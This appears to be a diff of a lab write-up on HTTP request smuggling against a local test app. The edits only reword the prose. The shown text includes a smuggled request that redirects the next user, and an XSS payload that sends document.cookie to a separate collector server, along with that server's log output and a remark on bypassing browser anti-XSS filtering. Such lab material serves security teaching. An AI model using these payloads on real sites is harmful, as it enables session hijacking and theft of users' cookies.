@@ -67,7 +67,7 @@ What happens here? The proxy send the whole request (to the end of NOTEXIST), si
 Send the above request a couple of time, then if you visit the site home page (http://localhost) you should be redirect to the contact page. Let's analyze the payload, focusing on the second request, starting from GET.
 So as previously explained the second request will be parsed by the backend and left in the HTTP tube. The next coming request will be appended to our malicious GET and the next user will be redirected to the contact form. Here we have also inserted two additional headers: the host and a fake one (X:). Please note that without this fake header the payload will generate a bad request error. At the moment of writing it's not clear to me why this header is needed, since I didn't find a cleat explanation. If you know the reason submit a pull request.
 
-In itself this is not considered an important vulnerability, but if you can chain it with another one, like XSS in our LAB, it's clear that it will be more serious. Let's consider the following paylod:
+Even an open redirect is not considered an important vulnerability, but if you can chain it with another one, like XSS,  it will become immediately more serious. Let's consider the following paylod:
 
     POST / HTTP/1.1
     Host: localhost
@@ -79,12 +79,12 @@ In itself this is not considered an important vulnerability, but if you can chai
     GET /contact.php?"><img src='http://localhost:8000/c.jpeg' onload=this.src='http://localhost:8000/?'+document.cookie> HTTP/1.1
     X:
 
-Here I used a classic payload to steal the user's cookie. Start a local python server, send the smuggled request a couple of time, then visiting a page on localhost you should see your cookie into the python server console:
+Here I used a classic payload to steal the user's cookie. Start a local python server, send the smuggled request a couple of time, then visiting a page on localhost you should see your cookies coming into the python server console:
 
     127.0.0.1 - - [04/Jun/2024 15:44:16] "GET /c.jpeg HTTP/1.1" 304 -
     127.0.0.1 - - [04/Jun/2024 15:44:16] "GET /?{073ef109-18e5-44ae-acb5-e4ce8d598d15}=value HTTP/1.1" 200 -
 
-I also hosted an image to avoid using the onerror event that will continue to send the second request since a time out occurs. Please note that the application does not use any cookies, I manually added one just to test the procedure.
+I also hosted an image to avoid using the onerror event that will continue to send the second request since a time out occurs. Please note that the application does not use any cookies, I manually added one just to test the payload.
 ### Additional notes
 This payload worked on Firefox and Chrome (last release), sent through Burp Repeater. Sending the payload directly through these browsers, will result in an encoded query string parameter, due to the anti-XSS features present on the browser. That will stop our exploit to work, indeed the smuggled request permitted to us to bypass these protections completely.
 
